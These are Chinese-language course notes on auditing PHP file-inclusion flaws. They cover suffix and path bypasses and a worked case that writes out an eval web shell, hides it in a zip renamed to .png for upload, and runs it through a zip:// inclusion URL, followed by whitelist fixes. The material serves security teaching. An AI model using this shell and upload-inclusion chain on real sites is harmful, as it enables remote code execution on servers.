# i春秋学院 进阶篇 PHP代码审计 - P14：文件包含漏洞的审计 🔍

在本节课中，我们将学习如何审计PHP代码中的文件包含漏洞。我们将分析漏洞的成因、常见的限制与绕过方法，并通过一个实际的代码审计案例，演示如何发现并利用文件包含漏洞。

---

## 概述 📖

文件包含漏洞的核心在于`include`、`require`等函数的参数可以被用户控制。本节课将首先回顾文件包含的基本概念，然后详细讲解审计此类漏洞的思路、常见的限制条件及其绕过技巧，最后通过一个实战案例演示完整的漏洞利用过程。

---

![](img/8646ad48f1baa2dd114f26c9b08e2221_1.png)

## 文件包含漏洞原理

上一节我们回顾了危险函数，本节中我们来看看文件包含漏洞的具体问题所在。

文件包含漏洞的问题在于`include`、`require`等相关函数的参数可控。我们可以将参数分为三段：**路径**、**文件名**和**后缀**。

**公式表示：**
```
include($path . $filename . $suffix);
```
当`$path`、`$filename`或`$suffix`中的任意部分由用户输入控制时，就可能引发文件包含漏洞。

![](img/8646ad48f1baa2dd114f26c9b08e2221_3.png)

---

![](img/8646ad48f1baa2dd114f26c9b08e2221_5.png)

![](img/8646ad48f1baa2dd114f26c9b08e2221_7.png)

## 常见限制与绕过方法

![](img/8646ad48f1baa2dd114f26c9b08e2221_9.png)

![](img/8646ad48f1baa2dd114f26c9b08e2221_11.png)

在审计过程中，程序通常会对文件包含操作施加限制。以下是常见的限制条件及对应的绕过思路。

![](img/8646ad48f1baa2dd114f26c9b08e2221_13.png)

![](img/8646ad48f1baa2dd114f26c9b08e2221_15.png)

### 1. 后缀限制
如果程序限制了包含文件的后缀（例如只允许包含`.inc`文件），可以考虑以下方法绕过：

![](img/8646ad48f1baa2dd114f26c9b08e2221_17.png)

*   **截断法**：利用旧版本PHP的字符串截断漏洞。例如，使用空字符`%00`进行截断。
    **代码示例：**
    ```php
    include($filename . ".inc"); // 如果$filename可控，传入"evil.php%00"
    ```
    > **注意**：高版本PHP已修复此漏洞，此方法通常无效。

*   **伪协议绕过**：使用PHP伪协议（如`php://filter`或`zip://`）来读取或包含非预期后缀的文件内容。

### 2. 路径限制
如果程序限制了包含文件的路径（例如只能包含`./templates/`目录下的文件），则伪协议和远程包含通常失效。此时可尝试包含以下文件：

以下是几种可能的包含目标：
*   用户上传的文件（如图片马）。
*   系统日志文件（如`/var/log/apache2/access.log`）。
*   环境变量文件（如`/proc/self/environ`）。
*   Session文件（如`/tmp/sess_[sessionid]`）。
*   临时文件（需结合条件竞争漏洞）。

### 3. 路径与后缀双重限制
如果程序同时限制了路径和后缀，则利用难度极大，通常认为无法直接利用。

### 4. 远程文件包含
如果服务器配置允许远程文件包含（`allow_url_include=On`），则可直接包含远程服务器上的文件。但该配置默认关闭。

---

## 实战案例：代码审计与利用

理论部分已经介绍完毕，现在我们来分析一段实际代码。我们将在`index.php`文件中找到一个包含点。

### 发现漏洞点
在`index.php`中，我们找到以下代码：
```php
include($_GET['page'] . '.inc');
```
这里，`$_GET['page']`参数可控，但程序会自动拼接`.inc`后缀。这属于我们前面提到的**后缀限制**情况。

### 确定利用思路
由于存在后缀限制，我们计划使用**伪协议**进行绕过。这里选择`zip://`协议，因为它可以读取ZIP压缩包内的指定文件。

![](img/8646ad48f1baa2dd114f26c9b08e2221_19.png)

**伪协议格式：**
```
zip://[压缩包文件绝对路径]#[压缩包内文件名]
```

![](img/8646ad48f1baa2dd114f26c9b08e2221_21.png)

### 构造攻击载荷
我们需要创建一个包含恶意代码的`shell.inc`文件，将其压缩为ZIP包，然后重命名为`shell.png`以上传。

![](img/8646ad48f1baa2dd114f26c9b08e2221_23.png)

**1. 创建恶意文件 `shell.inc`：**
```php
<?php @eval($_GET['cmd']); ?>
```
**2. 打包并重命名：**
```bash
zip shell.zip shell.inc
mv shell.zip shell.png
```

![](img/8646ad48f1baa2dd114f26c9b08e2221_25.png)

### 上传文件
找到网站的头像上传功能，将`shell.png`文件上传。通过分析上传处理代码`user/update.php`，发现其仅通过后缀判断文件类型，因此可以成功上传。

![](img/8646ad48f1baa2dd114f26c9b08e2221_27.png)

### 获取文件路径
上传后，文件被重命名保存。通过分析代码，发现文件名格式为`u_[timestamp]_[originalname]`。我们需要获取服务器的时间戳来构造完整路径。

**黑科技：** 通过Burp Suite拦截上传请求的响应头，其中的`Date`字段包含了服务器时间。使用PHP的`strtotime()`函数可以将其转换为时间戳。
```php
$timestamp = strtotime("响应头中的Date字符串");
```
在时间戳前后尝试几次，即可爆破出正确的文件名。

### 发起攻击
构造最终的包含Payload：
```
index.php?page=zip://绝对路径/upload/u_1588888888_shell.png%23shell
```
访问该URL，即可成功包含我们压缩包内的`shell.inc`文件，执行任意PHP代码。

![](img/8646ad48f1baa2dd114f26c9b08e2221_29.png)

![](img/8646ad48f1baa2dd114f26c9b08e2221_31.png)

**验证漏洞：**
访问以下URL，如果成功输出PHP配置信息，则证明漏洞利用成功。
```
index.php?page=zip://...&cmd=phpinfo();
```

![](img/8646ad48f1baa2dd114f26c9b08e2221_33.png)

---

![](img/8646ad48f1baa2dd114f26c9b08e2221_35.png)

## 漏洞修复方案 🛡️

最后，我们来看看如何修复此类文件包含漏洞。核心原则是：**不要允许用户输入直接控制包含函数的参数**。

以下是两种修复方案：

![](img/8646ad48f1baa2dd114f26c9b08e2221_37.png)

**1. 白名单校验**
定义一个允许包含的模块白名单数组，只包含数组内存在的文件。
```php
$allowedPages = ['about', 'contact', 'home'];
$page = $_GET['page'];
if (in_array($page, $allowedPages)) {
    include('./modules/' . $page . '.inc');
} else {
    die('Invalid page requested.');
}
```

![](img/8646ad48f1baa2dd114f26c9b08e2221_39.png)

**2. 固定目录前缀**
在包含路径前添加固定的目录前缀，防止目录遍历和伪协议的使用。
```php
include('./templates/' . $_GET['page'] . '.tpl');
```
这样，即使用户传入`zip://...`，也会被当作一个子目录名，从而包含失败。

![](img/8646ad48f1baa2dd114f26c9b08e2221_41.png)

---

![](img/8646ad48f1baa2dd114f26c9b08e2221_43.png)

## 总结 📝

![](img/8646ad48f1baa2dd114f26c9b08e2221_45.png)

本节课我们一起学习了PHP文件包含漏洞的审计方法。

我们首先回顾了漏洞原理，即`include`/`require`等函数的参数用户可控。然后分析了常见的**后缀限制**、**路径限制**及其绕过方法，重点介绍了**伪协议（如`zip://`）** 的利用。接着，通过一个实战案例，完整演示了从发现包含点、构造恶意文件、上传获取路径到最终利用漏洞的过程。最后，探讨了通过**白名单校验**和**固定目录前缀**两种方式来修复此类漏洞。

![](img/8646ad48f1baa2dd114f26c9b08e2221_47.png)

理解并掌握文件包含漏洞的审计思路，对于提高PHP代码的安全性至关重要。